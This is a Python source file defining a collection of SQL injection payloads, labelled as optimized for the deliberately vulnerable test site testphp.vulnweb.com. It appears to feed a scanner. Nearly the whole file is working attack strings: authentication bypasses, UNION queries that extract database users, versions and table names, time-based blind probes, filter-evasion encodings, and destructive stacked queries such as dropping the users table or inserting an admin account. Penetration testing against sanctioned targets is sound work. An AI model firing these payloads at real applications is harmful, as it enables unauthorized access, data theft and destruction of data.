"""
SQL injection payloads for testing SQL injection vulnerabilities
"""

class SQLiPayloads:
    """SQL injection payload collection optimized for testphp.vulnweb.com"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic SQL injection payloads optimized for testphp.vulnweb.com"""
        return [
            # Basic error-based - testphp.vulnweb.com specific
            "'",
            "''",
            '"',
            '""',
            
            # testphp.vulnweb.com confirmed working patterns
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            
            # Boolean-based
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            '" OR "1"="1',
            '" OR 1=1--',
            '" OR 1=1#',
            
            # Authentication bypass
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR 'a'='a",
            '" OR "a"="a',
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            
            # Union-based for testphp.vulnweb.com
            "' UNION SELECT 1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "1' UNION SELECT 1,2,3--",
            "1 UNION SELECT 1,2,3",
            "' UNION ALL SELECT 1--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT 1,2,3--",
            
            # Time-based blind
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            
            # Error-based for MySQL (testphp.vulnweb.com uses MySQL)
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)--",
            
            # Numeric injection for testphp.vulnweb.com
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1 OR 1=1",
            "1 OR 1=2",
            "1) OR (1=1",
            
            # Comment variations
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 LIMIT 1#",
            "' OR 1=1 LIMIT 1/*",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'admin','admin')--",
            
            # Double query
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT COUNT(*) FROM mysql.user)>0--",
            
            # Parameter-specific for testphp.vulnweb.com
            "artist=' OR '1'='1",
            "cat=' OR '1'='1",
            "pic=' OR '1'='1",
            "id=' OR '1'='1",
            "uname=' OR '1'='1",
            "uuname=' OR '1'='1",
            
            # Blind SQL injection patterns
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
            "' AND (SELECT COUNT(*) FROM information_schema.schemata)>0--",
            
            # Bypass filters
            "' /**/OR/**/1=1--",
            "' %00OR%001=1--",
            "'+OR+'1'='1'--",
            "' OR 'x'='x",
            
            # Double encoding
            "%27%20OR%201=1--",
            "%22%20OR%201=1--",
            
            # Alternative operators
            "' || '1'='1",
            "' && '1'='1",
            "' | '1'='1",
            "' & '1'='1"
        ]
    
    @staticmethod
    def get_time_based_payloads():
        """Get time-based SQL injection payloads"""
        return [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "1; SELECT SLEEP(5)",
            "' UNION SELECT SLEEP(5)--"
        ]
    
    @staticmethod
    def get_union_payloads():
        """Get UNION-based SQL injection payloads"""
        return [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--"
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all SQL injection payloads"""
        return (SQLiPayloads.get_basic_payloads() + 
                SQLiPayloads.get_time_based_payloads() + 
                SQLiPayloads.get_union_payloads())
